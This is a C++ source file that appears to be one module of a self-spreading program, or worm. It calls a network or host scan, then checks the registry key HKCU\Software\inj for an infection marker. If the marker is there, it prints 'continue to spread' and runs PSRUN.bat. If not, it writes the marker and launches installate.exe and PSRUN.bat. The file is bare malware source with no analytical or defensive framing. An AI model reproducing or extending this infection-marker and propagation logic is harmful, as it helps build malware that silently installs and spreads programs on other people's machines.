#include "pch.h"
#include "regfunc.h"

void regfunc::execute()
{
	_TCHAR szTestString[] = _T("injected");
	_TCHAR szPath[] = _T("Software\\inj\\");
	HKEY hKey = 0;
	HKEY SECTION = HKEY_CURRENT_USER;

	SCAN a;
	a.execute();

	if (RegOpenKeyEx(SECTION, L"Software\\inj\\", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryValueEx(hKey, TEXT("Test string"), NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			printf("You've already installed it here, continue to spread.\n");
			WinExec("PSRUN.bat", SW_SHOW);

		}

		else
		{

			RegCreateKeyEx(HKEY_CURRENT_USER, szPath, 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
			RegSetValueEx(hKey, _T("Test string"), 0, REG_SZ, (BYTE*)szTestString, sizeof(szTestString));
			RegCloseKey(hKey);
			WinExec("installate.exe", SW_SHOW);
			WinExec("PSRUN.bat", SW_SHOW);


		}


	}
	else
	{

		RegCreateKeyEx(HKEY_CURRENT_USER, szPath, 0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
		RegSetValueEx(hKey, _T("Test string"), 0, REG_SZ, (BYTE*)szTestString, sizeof(szTestString));
		RegCloseKey(hKey);
		WinExec("installate.exe", SW_SHOW);
		WinExec("PSRUN.bat", SW_SHOW);
	}
}
